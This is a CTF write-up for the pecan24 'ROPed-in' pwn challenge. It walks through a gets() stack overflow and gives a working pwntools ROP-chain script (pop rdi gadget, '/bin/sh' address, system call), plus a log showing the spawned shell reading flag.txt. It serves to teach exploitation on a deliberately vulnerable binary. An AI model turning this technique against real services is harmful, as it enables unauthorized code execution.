# Intended Solution for ROPed-in

We are given the `vuln.c` source, and see that `gets` is used.<br/>

Hopefully the name of the chall indicates that we might want to make a ROP chain.<br/>
We have a call to `system` in the binary at 0x401863, so we should try to call system with "/bin/sh" as an argument.

```
gef➤  disas nothing_to_see_here 
Dump of assembler code for function nothing_to_see_here:
   0x0000000000401855 <+0>:     push   rbp
   0x0000000000401856 <+1>:     mov    rbp,rsp
   0x0000000000401859 <+4>:     lea    rax,[rip+0x737b0]        # 0x475010
   0x0000000000401860 <+11>:    mov    rdi,rax
   0x0000000000401863 <+14>:    call   0x404a30 <system>
   0x0000000000401868 <+19>:    nop
   0x0000000000401869 <+20>:    pop    rbp
   0x000000000040186a <+21>:    ret
End of assembler dump.
```

Conveniently, "/bin/sh" is at the end of an existing string in .rodata.
```
gef➤  info files
Symbols from "/home/justjayiguess/Documents/ctfs/pecan24/pwn/ROPed-in/vuln".
Local exec file:
        `/home/justjayiguess/Documents/ctfs/pecan24/pwn/ROPed-in/vuln', file type elf64-x86-64.
        Entry point: 0x401730
        0x0000000000400270 - 0x0000000000400290 is .note.gnu.property
        0x0000000000400290 - 0x00000000004002b4 is .note.gnu.build-id
        0x00000000004002b4 - 0x00000000004002d4 is .note.ABI-tag
        0x00000000004002d8 - 0x00000000004004e8 is .rela.plt
        0x0000000000401000 - 0x0000000000401017 is .init
        0x0000000000401018 - 0x00000000004010c8 is .plt
        0x0000000000401100 - 0x00000000004744d1 is .text
        0x00000000004744d4 - 0x00000000004744dd is .fini
        0x0000000000475000 - 0x0000000000490ab4 is .rodata
        0x0000000000490ac0 - 0x0000000000490b20 is rodata.cst32
        0x0000000000490b20 - 0x000000000049c660 is .eh_frame
        0x000000000049c660 - 0x000000000049c76f is .gcc_except_table
        0x000000000049d2f0 - 0x000000000049d308 is .tdata
        0x000000000049d308 - 0x000000000049d348 is .tbss
        0x000000000049d308 - 0x000000000049d310 is .init_array
        0x000000000049d310 - 0x000000000049d320 is .fini_array
        0x000000000049d320 - 0x00000000004a0f48 is .data.rel.ro
        0x00000000004a0f48 - 0x00000000004a0fd8 is .got
        0x00000000004a0fe8 - 0x00000000004a10b0 is .got.plt
        0x00000000004a10c0 - 0x00000000004a2ac0 is .data
        0x00000000004a2ac0 - 0x00000000004a84c8 is .bss
gef➤  x/50s 0x0000000000475000
0x475000 <_IO_stdin_used>:      "\001"
0x475002 <_IO_stdin_used+2>:    "\002"
0x475004 <dummy_bucket.6>:      ""
0x475005 <dummy_bucket.6+1>:    ""
0x475006 <dummy_bucket.6+2>:    ""
0x475007 <dummy_bucket.6+3>:    ""
0x475008:       ""
0x475009:       ""
0x47500a:       "\200?"
0x47500d:       ""
0x47500e:       "@@echo \"echo.. echo... echo....\""
0x47502f:       "sure"
0x475034:       ":o\n"
0x475038:       ":(\n"
0x47503c:       ""
0x47503d:       ""
0x47503e:       ""
0x47503f:       ""
0x475040:       "What if we `cat flag.txt`ed next to the /bin/sh"
``` 
So at the address 0x475068, we have "/bin/sh".
By linux calling conventions, we will need to pop this address into rdi. Using `ROPgadget --binary ./vuln --re "pop rdi"`, we find a nice looking gadget for this.
```
0x00000000004020d8 : pop rdi ; ret
```
So then our payload should something like:
```
AA...A (some amount of padding until we hit the return address on the stack)
0x4020d8 (address of pop rdi gadget)
0x475068 (address of "/bin/sh")
0x401863 (address of call to system)
```
This should all be padded for 64 bits, which pwntools makes pretty easy.
Either by trial and error, or using 'pattern create' in gdb, we can find that we need 40 bytes of padding before we hit the return address.
<br/>
Here is the final script:

```python
from pwn import *

# --- Payload ---
pop_gadget = p64(0x00000000004020d8)
system_gadget = p64(0x0000000000401863)

payload = b"A"*40
payload += pop_gadget
payload += p64(0x475068) # Location of "/bin/sh" in .rodata section
payload += system_gadget

# --- Executing payload locally ---
p = remote("localhost", 1357)   # not localhost in the actual chall
print(p.recv())
p.sendline(payload)
p.interactive()

```

And here is it being executed.
```
┌──(justjayiguess㉿just-jay)-[~/…/ctfs/pecan24/pwn/ROPed-in]
└─$ python3 solve.py 
[+] Opening connection to localhost on port 1357: Done
b'What if we `cat flag.txt`ed next to the /bin/sh\nhaha jk jk...\n...unless?\n\n> '
[*] Switching to interactive mode
:(

$ ls
flag.txt  vuln
$ cat flag.txt
pecan{ret_t0_s3nder_:o}
$ 
[*] Interrupted
[*] Closed connection to localhost port 1357
```
